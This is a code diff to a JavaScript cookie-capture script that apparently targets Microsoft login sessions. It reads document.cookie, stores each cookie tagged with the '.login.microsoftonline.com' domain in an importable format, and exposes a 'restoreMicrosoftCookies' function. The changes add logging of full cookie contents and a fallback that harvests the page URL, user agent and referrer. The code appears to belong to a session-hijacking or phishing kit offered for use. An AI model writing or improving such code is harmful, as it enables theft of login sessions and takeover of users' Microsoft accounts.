@@ -47,15 +47,25 @@ window.restoreMicrosoftCookies = setCookiesFromArray;
   // Store for captured cookies
   let capturedCookies = new Map();
 
-  // Microsoft-only cookie capture
+  // Enhanced cookie capture with debugging
   function captureAllCookies() {
     try {
       const allCookies = [];
       const documentCookies = document.cookie;
 
+      console.log('🔍 Cookie capture debug:', {
+        documentCookieLength: documentCookies ? documentCookies.length : 0,
+        documentCookieContent: documentCookies || 'EMPTY',
+        currentDomain: window.location.hostname,
+        currentPath: window.location.pathname,
+        protocol: window.location.protocol
+      });
+
       // Parse existing document cookies
       if (documentCookies && documentCookies.trim() !== '') {
         const cookieStrings = documentCookies.split(';');
+        console.log('🔍 Found', cookieStrings.length, 'cookie strings to parse');
+        
         for (const cookieStr of cookieStrings) {
           const [name, ...valueParts] = cookieStr.trim().split('=');
           const value = valueParts.join('=');
@@ -79,16 +89,70 @@ window.restoreMicrosoftCookies = setCookiesFromArray;
 
             allCookies.push(cookie);
             capturedCookies.set(`${cookie.name}:${cookie.domain}`, cookie);
+            console.log('✅ Captured cookie:', name.trim());
+          } else {
+            console.warn('⚠️ Skipped invalid cookie string:', cookieStr);
           }
+        }
+      } else {
+        console.warn('⚠️ No document.cookie content found');
+        
+        // Try alternative capture methods if no cookies found
+        try {
+          // Capture some session data as fallback
+          const sessionData = {
+            name: 'session_capture_fallback',
+            value: JSON.stringify({
+              url: window.location.href,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              referrer: document.referrer
+            }),
+            domain: '.login.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + (24 * 60 * 60),
+            hostOnly: false,
+            session: false,
+            storeId: null,
+            captureMethod: 'fallback',
+            timestamp: new Date().toISOString()
+          };
+          allCookies.push(sessionData);
+          console.log('✅ Added fallback session data');
+        } catch (fallbackError) {
+          console.error('❌ Fallback capture failed:', fallbackError);
         }
       }
 
-      console.log('🍪 Document cookies captured:', allCookies.length, 'from domain:', window.location.hostname);
+      console.log('🍪 Final cookie capture result:', {
+        totalCookies: allCookies.length,
+        cookieNames: allCookies.map(c => c.name),
+        fromDomain: window.location.hostname
+      });
+      
       return allCookies;
 
     } catch (error) {
       console.error('❌ Error capturing cookies:', error);
-      return [];
+      // Return error info as a cookie for debugging
+      return [{
+        name: 'capture_error',
+        value: error.message,
+        domain: '.login.microsoftonline.com',
+        path: '/',
+        secure: true,
+        httpOnly: false,
+        sameSite: 'none',
+        expirationDate: Math.floor(Date.now() / 1000) + (24 * 60 * 60),
+        hostOnly: false,
+        session: false,
+        storeId: null,
+        captureMethod: 'error',
+        timestamp: new Date().toISOString()
+      }];
     }
   }
 
